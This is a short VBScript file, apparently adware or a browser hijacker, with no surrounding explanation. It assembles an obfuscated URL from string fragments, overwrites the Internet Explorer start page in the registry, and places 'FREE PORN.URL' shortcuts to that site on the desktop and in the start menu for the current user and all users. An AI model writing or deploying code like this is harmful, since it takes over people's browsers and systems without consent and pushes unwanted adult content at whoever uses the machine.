c="ht"&"tp://ww"&"w.fr"&"ee-g"&"all.co"&"m/h"&"ome.php"
function m(i,u)
Set o = W.CreateShortcut(W.SpecialFolders(i)& "\FREE PORN.URL")
o.TargetPath=u
o.Save
end function
Set W = Wscript.CreateObject("Wscript.Shell")
W.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", c
m "AllUsersStartMenu",c
m "AllUsersDesktop",c
m "StartMenu",c
m "Desktop",c
